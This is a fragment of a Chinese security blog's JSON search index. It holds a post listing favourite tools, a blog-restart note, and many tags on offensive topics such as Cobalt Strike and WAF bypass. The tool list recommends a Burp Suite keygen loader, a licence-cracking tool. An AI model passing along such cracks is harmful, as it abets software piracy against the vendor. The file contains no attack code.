&lt;/activity&gt;","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://blog.njcit.me/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"常用Github项目","slug":"杂项/常用Github项目","date":"2022-12-06T07:14:22.000Z","updated":"2023-03-27T07:38:54.075Z","comments":true,"path":"2022/12/06/杂项/常用Github项目/","link":"","permalink":"https://blog.njcit.me/2022/12/06/%E6%9D%82%E9%A1%B9/%E5%B8%B8%E7%94%A8Github%E9%A1%B9%E7%9B%AE/","excerpt":"","text":"碎碎念 好久不写博客了，总感觉自己没在学新东西，偶尔写一点东西记录一下吧 正文 BurpLoaderKeygen,链接：burpsuite loader 其他burpsuite插件，链接bp插件 扫目录的，链接dirsearch 另一款抓包工具yakit，链接yakit 结束语 未完待续，chatgpt真好玩","categories":[],"tags":[{"name":"杂谈","slug":"杂谈","permalink":"https://blog.njcit.me/tags/%E6%9D%82%E8%B0%88/"}]},{"title":"新新新开始","slug":"杂项/新新新开始","date":"2022-12-06T06:05:47.000Z","updated":"2023-06-21T08:14:36.877Z","comments":true,"path":"2022/12/06/杂项/新新新开始/","link":"","permalink":"https://blog.njcit.me/2022/12/06/%E6%9D%82%E9%A1%B9/%E6%96%B0%E6%96%B0%E6%96%B0%E5%BC%80%E5%A7%8B/","excerpt":"","text":"闲言碎语 老blog重新捡了起来，之前的可以去github commit历史去看 感谢GitHub，感谢开源社区，知识总要共享，总要成体系，藏着有啥意思。","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"https://blog.njcit.me/tags/%E6%9D%82%E9%A1%B9/"}]}],"categories":[],"tags":[{"name":"注入, MySQL","slug":"注入-MySQL","permalink":"https://blog.njcit.me/tags/%E6%B3%A8%E5%85%A5-MySQL/"},{"name":"dirsearch","slug":"dirsearch","permalink":"https://blog.njcit.me/tags/dirsearch/"},{"name":"hexo","slug":"hexo","permalink":"https://blog.njcit.me/tags/hexo/"},{"name":"优化","slug":"优化","permalink":"https://blog.njcit.me/tags/%E4%BC%98%E5%8C%96/"},{"name":"ctf","slug":"ctf","permalink":"https://blog.njcit.me/tags/ctf/"},{"name":"爆破","slug":"爆破","permalink":"https://blog.njcit.me/tags/%E7%88%86%E7%A0%B4/"},{"name":"gobuster","slug":"gobuster","permalink":"https://blog.njcit.me/tags/gobuster/"},{"name":"工具","slug":"工具","permalink":"https://blog.njcit.me/tags/%E5%B7%A5%E5%85%B7/"},{"name":"刷机","slug":"刷机","permalink":"https://blog.njcit.me/tags/%E5%88%B7%E6%9C%BA/"},{"name":"移动安全","slug":"移动安全","permalink":"https://blog.njcit.me/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"},{"name":"jwt","slug":"jwt","permalink":"https://blog.njcit.me/tags/jwt/"},{"name":"tricks","slug":"tricks","permalink":"https://blog.njcit.me/tags/tricks/"},{"name":"书签","slug":"书签","permalink":"https://blog.njcit.me/tags/%E4%B9%A6%E7%AD%BE/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.njcit.me/tags/Linux/"},{"name":"metasploit","slug":"metasploit","permalink":"https://blog.njcit.me/tags/metasploit/"},{"name":"shell","slug":"shell","permalink":"https://blog.njcit.me/tags/shell/"},{"name":"exp","slug":"exp","permalink":"https://blog.njcit.me/tags/exp/"},{"name":"quake","slug":"quake","permalink":"https://blog.njcit.me/tags/quake/"},{"name":"网络空间搜索引擎","slug":"网络空间搜索引擎","permalink":"https://blog.njcit.me/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"},{"name":"waf","slug":"waf","permalink":"https://blog.njcit.me/tags/waf/"},{"name":"bypass","slug":"bypass","permalink":"https://blog.njcit.me/tags/bypass/"},{"name":"AI","slug":"AI","permalink":"https://blog.njcit.me/tags/AI/"},{"name":"代码审计","slug":"代码审计","permalink":"https://blog.njcit.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"反序列化","slug":"反序列化","permalink":"https://blog.njcit.me/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"hvv","slug":"hvv","permalink":"https://blog.njcit.me/tags/hvv/"},{"name":"漏洞扫描","slug":"漏洞扫描","permalink":"https://blog.njcit.me/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"name":"攻防演练","slug":"攻防演练","permalink":"https://blog.njcit.me/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"},{"name":"xray","slug":"xray","permalink":"https://blog.njcit.me/tags/xray/"},{"name":"自动化","slug":"自动化","permalink":"https://blog.njcit.me/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"geacon_pro","slug":"geacon-pro","permalink":"https://blog.njcit.me/tags/geacon-pro/"},{"name":"cobaltstrike","slug":"cobaltstrike","permalink":"https://blog.njcit.me/tags/cobaltstrike/"},{"name":"内网","slug":"内网","permalink":"https://blog.njcit.me/tags/%E5%86%85%E7%BD%91/"},{"name":"frp","slug":"frp","permalink":"https://blog.njcit.me/tags/frp/"},{"name":"nali","slug":"nali","permalink":"https://blog.njcit.me/tags/nali/"},{"name":"openwrt","slug":"openwrt","permalink":"https://blog.njcit.me/tags/openwrt/"},{"name":"路由器","slug":"路由器","permalink":"https://blog.njcit.me/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"something","slug":"something","permalink":"https://blog.njcit.me/tags/something/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://blog.njcit.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.njcit.me/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"c","slug":"c","permalink":"https://blog.njcit.me/tags/c/"},{"name":"c++","slug":"c","permalink":"https://blog.njcit.me/tags/c/"},{"name":"代码","slug":"代码","permalink":"https://blog.njcit.me/tags/%E4%BB%A3%E7%A0%81/"},{"name":"开发","slug":"开发","permalink":"https://blog.njcit.me/tags/%E5%BC%80%E5%8F%91/"},{"name":"golang","slug":"golang","permalink":"https://blog.njcit.me/tags/golang/"},{"name":"杂项","slug":"杂项","permalink":"https://blog.njcit.me/tags/%E6%9D%82%E9%A1%B9/"},{"name":"加密","slug":"加密","permalink":"https://blog.njcit.me/tags/%E5%8A%A0%E5%AF%86/"},{"name":"微信小程序","slug":"微信小程序","permalink":"https://blog.njcit.me/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"前端","slug":"前端","permalink":"https://blog.njcit.me/tags/%E5%89%8D%E7%AB%AF/"},{"name":"Android","slug":"Android","permalink":"https://blog.njcit.me/tags/Android/"},{"name":"抓包","slug":"抓包","permalink":"https://blog.njcit.me/tags/%E6%8A%93%E5%8C%85/"},{"name":"小程序","slug":"小程序","permalink":"https://blog.njcit.me/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"反编译","slug":"反编译","permalink":"https://blog.njcit.me/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"},{"name":"分区","slug":"分区","permalink":"https://blog.njcit.me/tags/%E5%88%86%E5%8C%BA/"},{"name":"Android逆向","slug":"Android逆向","permalink":"https://blog.njcit.me/tags/Android%E9%80%86%E5%90%91/"},{"name":"shodan","slug":"shodan","permalink":"https://blog.njcit.me/tags/shodan/"},{"name":"powershell","slug":"powershell","permalink":"https://blog.njcit.me/tags/powershell/"},{"name":"burpsuite","slug":"burpsuite","permalink":"https://blog.njcit.me/tags/burpsuite/"},{"name":"火狐","slug":"火狐","permalink":"https://blog.njcit.me/tags/%E7%81%AB%E7%8B%90/"},{"name":"杂谈","slug":"杂谈","permalink":"https://blog.njcit.me/tags/%E6%9D%82%E8%B0%88/"}]}